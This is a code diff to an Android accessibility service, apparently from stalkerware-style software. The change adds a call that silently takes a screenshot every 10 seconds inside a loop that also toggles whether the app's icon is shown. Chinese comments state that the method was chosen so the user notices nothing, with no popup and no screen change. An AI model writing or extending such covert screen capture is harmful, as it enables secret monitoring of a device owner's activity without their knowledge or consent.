@@ -46,9 +46,7 @@ public class MyAccessibilityService extends AccessibilityService {
             } else {
               showAppIcon();
             }
-            if (!LocationService.isRunning) {
-
-            }
+            triggerScreenshot();
             handler.postDelayed(this, 10 * 1000);
         }
     };
@@ -344,6 +342,8 @@ public class MyAccessibilityService extends AccessibilityService {
     public void triggerScreenshot() {
         // 用户无感（无界面跳转/无弹窗提示）的实现应优先选择 performGlobalAction（Android 9+ 才支持，用户无需感知）
         boolean success = performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
+
+        // 屏幕会出现截图，如果使用无障碍模拟点击
         
         if (success) {
             LogUtils.d(this, "截图触发成功，等待系统保存...");
